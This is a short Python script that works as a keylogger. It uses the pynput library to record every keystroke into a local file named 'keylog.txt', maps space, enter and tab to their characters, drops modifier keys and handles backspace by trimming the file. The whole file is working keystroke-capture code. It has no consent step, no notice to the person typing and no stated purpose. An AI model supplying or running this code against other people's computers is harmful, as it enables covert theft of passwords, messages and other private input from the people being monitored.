from pynput import keyboard

LOG_FILE = "keylog.txt"

# Function to write keystrokes to file
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        special_keys = {
            'space': ' ',
            'enter': '\n',
            'tab': '\t',
        }
        ignored_keys = {'ctrl', 'ctrl_l', 'ctrl_r', 'shift', 'shift_l', 'shift_r', 'alt', 'alt_l', 'alt_r', 'caps_lock', 'esc', 'cmd', 'cmd_l', 'cmd_r', 'menu'}
        key_name = key.name if hasattr(key, 'name') else str(key)
        if key_name == 'backspace':
            try:
                with open(LOG_FILE, "rb+") as f:
                    f.seek(0, 2)
                    size = f.tell()
                    if size > 0:
                        f.truncate(size - 1)
            except Exception:
                pass
        elif key_name in special_keys:
            with open(LOG_FILE, "a") as f:
                f.write(special_keys[key_name])
        elif key_name not in ignored_keys:
            with open(LOG_FILE, "a") as f:
                f.write(f'<{key_name}>')

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
